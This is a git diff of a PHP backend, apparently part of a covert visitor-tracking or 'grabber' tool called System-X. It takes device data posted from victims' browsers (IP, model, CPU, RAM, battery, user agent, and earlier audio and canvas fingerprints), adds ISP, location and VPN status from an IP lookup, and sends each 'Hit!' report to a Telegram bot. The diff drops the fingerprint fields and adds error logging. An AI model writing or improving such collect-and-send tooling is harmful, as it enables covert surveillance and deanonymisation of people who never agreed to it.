@@ -1,4 +1,8 @@
 <?php
+// 1. تفعيل عرض الأخطاء في اللوجات عشان نشوفها المرة الجاية
+ini_set('display_errors', 1);
+error_reporting(E_ALL);
+
 require_once 'config.php';
 require_once 'telegram.php';
 
@@ -9,46 +13,42 @@ if ($d) {
     $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
     $ip = explode(',', $ip)[0];
 
-    // استخبارات الأي بي (Timeout 1.5s لتجنب التعليق)
-    $ctx = stream_context_create(['http' => ['timeout' => 1.5]]);
-    $api = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,as,hosting", false, $ctx), true);
-    
-    $isp = $api['isp'] ?? 'Unknown';
-    $loc = ($api['city'] ?? '') . ", " . ($api['country'] ?? '');
-    $vpn = ($api['hosting'] ?? false) ? "نعم (VPN/Proxy) 🔴" : "لا (حقيقي) 🟢";
+    // 2. محاولة جلب البيانات بسرعة قصوى (مهلة ثانية واحدة فقط)
+    $isp = "Unknown"; $loc = "Unknown"; $vpn = "Unknown";
+    try {
+        $ctx = stream_context_create(['http' => ['timeout' => 1.2]]); 
+        $apiRaw = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,hosting", false, $ctx);
+        if ($apiRaw) {
+            $api = json_decode($apiRaw, true);
+            if ($api && $api['status'] === 'success') {
+                $isp = $api['isp'] ?? 'Unknown';
+                $loc = ($api['city'] ?? '') . ", " . ($api['country'] ?? '');
+                $vpn = ($api['hosting'] ?? false) ? "نعم 🔴" : "لا 🟢";
+            }
+        }
+    } catch (Exception $e) { /* كمل لو فشل */ }
 
-    // تخمين الموديل لو مختفي
-    $model = $d['model'] ?? 'Hidden';
-    if($model == 'Hidden' && strpos($d['gpu'], 'Adreno (TM) 740') !== false) $model = "S23/S24 Ultra (Detected)";
-
-    $msg = "🚀 <b>System-X: New Dossier</b>\n";
+    // 3. بناء الرسالة (تأكد إن المتغيرات موجودة عشان ميعملش Error)
+    $msg = "🎯 <b>System-X: Hit!</b>\n";
     $msg .= "━━━━━━━━━━━━━━\n";
-    $msg .= "🌍 <b>الشبكة والموقع:</b>\n";
-    $msg .= "• الـ IP: <code>$ip</code>\n";
-    $msg .= "• الشركة: <code>$isp</code>\n";
-    $msg .= "• الموقع: <code>$loc</code>\n";
-    $msg .= "• VPN: <b>$vpn</b>\n\n";
-
-    $msg .= "📱 <b>الجهاز:</b>\n";
-    $msg .= "• الموديل: <code>$model</code>\n";
-    $msg .= "• النظام: <code>" . ($d['osv'] ?? 'N/A') . "</code>\n";
-    $msg .= "• المعالج: <code>{$d['hw']['cores']} Cores</code>\n";
-    $msg .= "• الرام: <code>{$d['hw']['ram']} GB</code> | الهارد: <code>" . ($d['disk'] ?? '0') . " GB</code>\n\n";
-
-    $msg .= "🖥️ <b>الشاشة والرسوميات:</b>\n";
-    $msg .= "• الأبعاد: <code>" . ($d['screen']['w'] * $d['screen']['dpr']) . "x" . ($d['screen']['h'] * $d['screen']['dpr']) . "</code>\n";
-    $msg .= "• الـ GPU: <code>{$d['gpu']}</code>\n\n";
-
-    $msg .= "🔍 <b>بصمات عميقة:</b>\n";
-    $msg .= "• بصمة الصوت: <code>{$d['audio']}</code>\n";
-    $msg .= "• بصمة الحسابات: <code>{$d['math']}</code>\n";
-    $msg .= "• الكانفاس: <code>{$d['canvas']}</code>\n\n";
-
-    $msg .= "🌐 <b>المتصفح:</b>\n";
-    $msg .= "<code>{$d['ua']}</code>\n";
+    $msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
+    $msg .= "🏢 <b>ISP:</b> <code>$isp</code>\n";
+    $msg .= "🛡️ <b>VPN:</b> $vpn\n\n";
+    
+    $msg .= "📱 <b>Device:</b> <code>" . ($d['model'] ?? 'N/A') . "</code>\n";
+    $msg .= "⚙️ <b>CPU:</b> <code>" . ($d['hw']['cores'] ?? '0') . "</code> | <b>RAM:</b> <code>" . ($d['hw']['ram'] ?? '0') . "GB</code>\n";
+    $msg .= "🔋 <b>Battery:</b> <code>" . ($d['bat']['level'] ?? 'N/A') . "%</code>\n\n";
+    
+    $msg .= "🔗 <b>UA:</b> <code>" . substr($d['ua'], 0, 100) . "...</code>\n";
     $msg .= "━━━━━━━━━━━━━━\n";
     $msg .= "👨‍💻 <b>Dev: @" . DEV_USERNAME . "</b>";
 
+    // 4. إرسال لـ تليجرام
     sendTelegramMessage($msg);
+    
+    // سطر للوجات السيرفر عشان نتأكد إن العملية تمت
+    error_log("System-X: Data sent for IP $ip");
+} else {
+    error_log("System-X: Received empty or invalid JSON");
 }
 ?>
